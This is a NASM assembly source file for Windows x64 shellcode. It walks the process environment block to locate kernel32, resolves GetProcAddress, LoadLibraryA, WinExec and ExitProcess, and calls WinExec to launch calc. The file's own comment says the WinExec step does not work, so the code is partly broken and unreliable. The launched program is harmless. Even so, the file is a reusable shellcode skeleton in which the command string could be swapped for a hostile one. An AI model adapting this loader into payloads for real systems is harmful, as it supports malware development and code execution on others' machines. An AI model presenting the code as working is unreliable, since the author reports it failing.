;-------------------------------------------------------------------------------------------------------
;  author: never
;  for win64 shellcode written in nasm(assembly)
;  it spwan calc, can be use for testing

;-------------------------------------------------------------------------------------------------------

BITS 64
SECTION .text
global main
main:
xor rcx, rcx            
mov rax, [gs:rcx + 0x60]
mov rax, [rax + 0x18]   
mov rsi, [rax + 0x20]  
lodsq                   
xchg rax, rsi         
lodsq                   
mov rbx, [rax + 0x20]    
xor r8, r8                
mov r8d, [rbx + 0x3c]    
mov rdx, r8               
add rdx, rbx             
mov r8d, [rdx + 0x88]     
add r8, rbx             
xor rsi, rsi               
mov esi, [r8 + 0x20]       
add rsi, rbx               
xor rcx, rcx              
mov r9, 0x41636f7250746547 


Get_Function:

inc rcx                    
xor rax, rax               
mov eax, [rsi + rcx * 4]   
add rax, rbx              
cmp QWORD [rax], r9        
jnz Get_Function
xor rsi, rsi             
mov esi, [r8 + 0x24]       
add rsi, rbx               
mov cx, [rsi + rcx * 2] 
xor rsi, rsi               
mov esi, [r8 + 0x1c]       
add rsi, rbx           
xor rdx, rdx               
mov edx, [rsi + rcx * 4]   
add rdx, rbx             
mov rdi, rdx              


getprocaddr:
mov rcx, 0x41797261         
push rcx                    
mov rcx, 0x7262694c64616f4c  
push rcx                     
mov rdx, rsp                 
mov rcx, rbx                
sub rsp, 0x30               
call rdi                   
add rsp, 0x30                
add rsp, 0x10                
mov rsi, rax                 



winexecaddr:
mov rcx, 0x636578456E6957 
push rcx   
mov rdx, rsp                 
mov rcx, rbx               
sub rsp, 0x30                
call rdi 
add rsp, 0x30
mov r15, rax               

;this is not working using goku7 method used in new.asm but it works there but not here 
;here i am calling winexec to spawn calc but didn't work
WinExec:
; UINT WinExec(
;   LPCSTR lpCmdLine,    => RCX = <COMMAND STRING> + 0x00 (Null Terminated)
;   UINT   uCmdShow      => RDX = 0x0 = SW_HIDE
; );
xor rcx, rcx
mul rcx
push rax
mov rax, 0x636c6163
push rax
mov rcx, rsp
inc rdx
sub rsp, 0x20
call r15                    ; Call WinExec(<COMMNAD>, SW_HIDE)
add rsp, 0x20               ; Fix stack



exit:
xor rcx, rcx           
mov rcx, 0x737365         
push rcx                
mov rcx, 0x636f725074697845  
push rcx 
mov rdx, rsp                
mov rcx, rbx                 
sub rsp, 0x30            
call rdi                    
add rsp, 0x30                
add rsp, 0x10         
mov r15, rax                 


mov rcx, 0     
call r15      
